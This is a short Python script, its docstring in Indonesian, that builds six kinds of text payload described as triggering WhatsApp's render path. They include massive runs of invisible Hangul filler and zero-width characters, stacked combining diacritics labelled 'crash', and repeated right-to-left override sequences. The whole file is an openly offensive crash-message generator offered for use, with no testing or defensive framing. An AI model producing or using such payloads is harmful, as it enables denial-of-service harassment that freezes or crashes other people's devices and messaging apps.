#!/usr/bin/env python3
"""Payload builder — 6 varian, semua memicu jalur render WhatsApp."""
import sys, random, string


def _r(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def build(kind, n):
    if kind == "delay":
        return "\u3164" * n
    if kind == "delay2":
        return "\u200b" * n
    if kind == "long":
        return _r(n)
    if kind == "crash":
        base, k, out = _r(30), max(3, n // 30), []
        for c in base:
            out.append(c)
            for _ in range(k):
                out.append(chr(0x300 + random.randint(0, 111)))
        return "".join(out)
    if kind == "crash2":
        unit = "\u202e" + _r(5) + "\u202c "
        return unit * max(1, n // len(unit))
    if kind == "combo":
        m = max(1, n // 4)
        return ("\u200b" * m + "\u3164" * m + "\u202e" + _r(m) +
                "\u202c " + "\U0001f9e0" * (m // 2) + _r(m))
    return "\u3164" * n


if __name__ == "__main__":
    k = sys.argv[1] if len(sys.argv) > 1 else "delay"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 20000
    sys.stdout.write(build(k, n))
